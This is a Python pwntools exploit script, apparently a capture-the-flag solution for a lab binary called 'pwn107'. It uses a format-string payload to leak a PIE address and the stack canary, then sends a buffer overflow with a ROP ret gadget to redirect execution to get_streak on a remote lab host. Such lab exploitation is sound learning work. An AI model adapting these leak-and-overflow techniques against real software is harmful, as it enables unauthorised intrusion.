from pwn import *

context.binary = binary = ELF("./pwn107.pwn107", checksec=False)
context.log_level = 'debug'

static_libc_csu_address = binary.symbols.__libc_csu_init

print("Address of static libc csu init: {}".format(hex(static_libc_csu_address)))

#p = process()
p = remote("10.10.179.131", 9007)

p.recvuntil(b"streak?")

#p.recv()

payload = b"%10$lX.%13$lX"
p.sendline(payload)

p.recvuntil(b"streak:")
p.recv()
output = p.recv().split(b"\n")[0]

dynamic_libc_csu_address = int(output.split(b".")[0].strip(), 16)
canary = int(output.split(b".")[1].strip(), 16)

print("Dynamic libc address is: {}".format(hex(dynamic_libc_csu_address)))
print("Canary is :{}".format(hex(canary)))

dynamic_base_address = dynamic_libc_csu_address - static_libc_csu_address
binary.address = dynamic_base_address


dynamic_get_streak = binary.symbols.get_streak
rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]
payload = b"A" * 0x18 + p64(canary) + b"B"*8 + p64(ret_gadget) + p64(dynamic_get_streak)

p.sendline(payload)
p.interactive()
